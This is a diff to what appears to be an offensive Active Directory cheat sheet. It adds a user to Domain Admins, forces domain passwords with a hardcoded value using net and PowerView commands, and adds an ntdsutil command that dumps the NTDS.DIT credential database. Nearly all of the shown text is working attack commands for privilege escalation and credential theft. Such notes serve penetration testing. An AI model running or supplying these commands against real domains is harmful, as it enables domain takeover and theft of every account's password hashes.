@@ -40,11 +40,11 @@ mstsc.exe
 ## ADD MEMBER
 ```
 # OPTION 1
-net group "Domain admins" dfm.a /add /domain
+net group "Domain admins" dagreat /add /domain
 
 # OPTION 2
 $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a',$SecPassword)
+$Cred = New-Object System.Management.Automation.PSCredential('<Domain>\dagreat',$SecPassword)
 Add-DomainGroupMember -Identity 'Domain Admins' -Members 'jomivz' -Credential $Cred
 
 # VERIFICATION
@@ -55,13 +55,13 @@ Get-DomainGroupMember -Identity 'Domain Admins'
 ## FORCE PASSWORD CHANGE
 ```
 # OPTION 1
-net user dfm.a Password123! /domain
+net user dagreat Password123! /domain
 
 # OPTION 2
 $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('TESTLABdfm.a',$SecPassword)
+$Cred = New-Object System.Management.Automation.PSCredential('<Domain>\dagreat',$SecPassword)
 $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
-Set-DomainUserPassword -Identity jomivz -AccountPassword $UserPassword ' -Credential $Cred
+Set-DomainUserPassword -Identity dagreat -AccountPassword $UserPassword -Credential $Cred
 ```
 
 ## KERBEROASTING
@@ -69,3 +69,7 @@ Set-DomainUserPassword -Identity jomivz -AccountPassword $UserPassword ' -Creden
 
 ```
 
+## DUMP NTDS.DIT
+```
+ntdsutil.exe "activate instance ntds" "ifm" "Create Full C:\Temp\ntds.dmp" quit quit
+```
